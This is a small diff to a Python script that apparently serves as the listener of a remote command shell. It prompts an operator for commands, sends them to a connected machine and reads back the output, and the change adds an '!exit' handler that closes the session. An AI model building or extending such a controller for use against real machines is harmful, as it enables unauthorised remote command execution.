@@ -12,8 +12,12 @@ while True:    #infinete loop
     print("Connecion from: {}".format(addr[0])) #Print name
 
     command = ""            # empty command
-    while "!exit" not in command: # wait for exit
+    while True: # wait for exit
         command = input("{}:$".format(addr[0])) #ask for command
+        if "!exit" in command:
+            con.send("!exit".encode())
+            con.close()
+            exit()
         con.send(command.encode()) #send command
 
         data = con.recv(1024)
